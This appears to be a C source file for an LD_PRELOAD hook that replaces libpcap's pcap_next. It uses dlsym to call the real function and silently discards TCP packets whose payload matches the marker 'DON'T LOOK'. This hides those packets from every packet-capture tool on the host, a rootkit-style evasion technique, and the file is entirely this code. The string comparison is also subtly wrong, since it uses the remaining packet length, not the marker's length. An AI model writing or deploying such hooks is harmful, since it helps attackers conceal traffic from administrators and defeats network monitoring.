#include "frame_analysis.h"
#include <netinet/tcp.h>
#include <dlfcn.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <string.h>

static u_char *(*og_pacp_next)(pcap_t *, struct pcap_pkthdr *) = NULL;
char secret_prefix[] = "DON'T LOOK";

const u_char *pcap_next(pcap_t *p, struct pcap_pkthdr *h)
{
    u_char *packet;
    u_char *payload;
    struct tcphdr *tcp_hdr;
    printf("WRAPPED\n");
    if (!og_pacp_next)
    {
        og_pacp_next = dlsym(RTLD_NEXT, "pcap_next");
        if (!og_pacp_next)
        {
            fprintf(stderr, "Error in dlysm: %s\n", dlerror());
            exit(1);
        }
    }
    packet = og_pacp_next(p, h);

    if (!(tcp_hdr = find_tcp_segment(packet, h->len)))
        // Not TCP
        return packet;

    if (!(payload = get_tcp_payload(tcp_hdr)))
        // Couldn't extract payload
        return packet;

    if (strncmp((char *)payload, secret_prefix, packet + h->len - payload) == 0)
        // Secret message found
        return pcap_next(p, h);

    return packet;

}


